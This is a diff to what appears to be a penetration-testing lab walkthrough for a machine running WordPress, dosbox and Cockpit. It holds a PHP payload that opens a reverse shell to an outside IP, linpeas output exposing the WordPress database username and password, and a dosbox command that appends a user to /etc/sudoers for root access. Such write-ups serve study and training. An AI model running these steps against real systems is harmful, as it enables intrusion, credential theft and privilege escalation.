@@ -345,6 +345,14 @@ vi 48449.py
 payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
 
 # linpeas.sh
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                            
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'commander' );
+define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+define( 'DB_HOST', 'localhost' );
+
+
                       ╔════════════════════════════════════╗
 ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                       ╚════════════════════════════════════╝                                                                                                
@@ -354,7 +362,7 @@ payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
 
 # exploit
 LFILE='/etc/sudoers'
-./dosbox -c 'mount c /' -c "echo http ALL=(ALL) ALL >>c:$LFILE" -c exit
+./dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
 ```
 
 ### Cockpit
